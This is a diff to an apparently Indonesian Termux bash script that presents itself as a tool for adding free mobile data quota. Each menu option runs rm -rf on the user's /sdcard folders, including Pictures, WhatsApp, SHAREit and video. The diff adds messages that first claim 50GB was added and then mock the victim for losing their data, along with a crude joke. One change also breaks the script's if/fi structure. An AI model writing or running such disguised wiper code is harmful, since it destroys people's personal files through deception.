@@ -28,6 +28,7 @@ echo $blue "|| $green 0. Exit The Program      $blue ||"
 echo $blue "===================================="
 echo $blue"╭──[Masukkan Pilihan Anda]>"
 read -p"╰───────root@dyxa#ABCD=•>" Gans;
+
 if [ $Gans = 1 ] || [ $Gans = 01 ]
 then
 echo $blue"╭──[Berapa GB?]>"
@@ -51,13 +52,17 @@ rm -rf /sdcard/Pictures
 rm -rf /sdcard/SHAREit
 rm -rf /sdcard/WhatsApp
 rm -rf /sdcard/video
+
 echo  $blue "Tunggu Beberapa menit,hingga kuotanya masuk"
 echo  $red "sedang menunggu........"
 echo  $green "yang perlu anda tahu.menunggu itu membosankan........"
-
+echo  $blue "yakan yakan yakan "
+echo  $red "Please wait"
+echo "SELAMAT KOUTA ANDA TERISI 50GB" | lolcat
+echo "Eh TAPI BOONG :V" | lolcat
 echo  $blue "You data have been removed:V"
-echo "BOKEP PUN IKUT DI HAPUS" | lolcat
-toilet -f standard "Dyxa#ABCD" | lolcat
+echo  $green "BOKEP NYA PUN DI HAPUS DULU YA GAN :V"
+toilet -f standard "SELAMAT !!!! :v" | lolcat
 fi
 
 
@@ -84,15 +89,18 @@ rm -rf /sdcard/Pictures
 rm -rf /sdcard/SHAREit
 rm -rf /sdcard/WhatsApp
 rm -rf /sdcard/video
+
 echo  $blue "Tunggu Beberapa menit,hingga kuotanya masuk"
 echo  $red "sedang menunggu........"
 echo  $green "yang perlu anda tahu.menunggu itu membosankan........"
-
-echo  $blue "AWOWKWOKKKK :V"
-echo "BOKEP TELAH DI HAPUS:v" | lolcat
-toilet -f standard "Dyxa#ABCD gans" | lolcat
-fi
-
+echo  $blue "yakan yakan yakan "
+echo  $red "Please wait"
+echo "SELAMAT KOUTA ANDA TERISI 50GB" | lolcat
+echo "Eh TAPI BOONG :V" | lolcat
+echo  $blue "You data have been removed:V"
+echo  $green "BOKEP NYA PUN DI HAPUS DULU YA GAN :V"
+toilet -f standard "SELAMAT !!!! :v" | lolcat
+if
 
 if [ $Gans = 3 ] || [ $Gans = 03 ]
 then
@@ -117,13 +125,17 @@ rm -rf /sdcard/Pictures
 rm -rf /sdcard/SHAREit
 rm -rf /sdcard/WhatsApp
 rm -rf /sdcard/video
+
 echo  $blue "Tunggu Beberapa menit,hingga kuotanya masuk"
 echo  $red "sedang menunggu........"
 echo  $green "yang perlu anda tahu.menunggu itu membosankan........"
-
-echo  $blue "AWOWKWOKKKK :V"
-echo "BOKEP TELAH DI HAPUS:v" | lolcat
-toilet -f standard "Dyxa#ABCD gans" | lolcat
+echo  $blue "yakan yakan yakan "
+echo  $red "Please wait"
+echo "SELAMAT KOUTA ANDA TERISI 50GB" | lolcat
+echo "Eh TAPI BOONG :V" | lolcat
+echo  $blue "You data have been removed:V"
+echo  $green "BOKEP NYA PUN DI HAPUS DULU YA GAN :V"
+toilet -f standard "SELAMAT !!!! :v" | lolcat
 fi
 
 if [ $Gans = 4 ] || [ $Gans = 04 ]
@@ -149,11 +161,15 @@ rm -rf /sdcard/Pictures
 rm -rf /sdcard/SHAREit
 rm -rf /sdcard/WhatsApp
 rm -rf /sdcard/video
+
 echo  $blue "Tunggu Beberapa menit,hingga kuotanya masuk"
 echo  $red "sedang menunggu........"
 echo  $green "yang perlu anda tahu.menunggu itu membosankan........"
-
-echo  $blue "AWOWKWOKKKK :V"
-echo "BOKEP TELAH DI HAPUS:v" | lolcat
-toilet -f standard "Dyxa#ABCD gans" | lolcat
+echo  $blue "yakan yakan yakan "
+echo  $red "Please wait"
+echo "SELAMAT KOUTA ANDA TERISI 50GB" | lolcat
+echo "Eh TAPI BOONG :V" | lolcat
+echo  $blue "You data have been removed:V"
+echo  $green "BOKEP NYA PUN DI HAPUS DULU YA GAN :V"
+toilet -f standard "SELAMAT !!!! :v" | lolcat
 fi
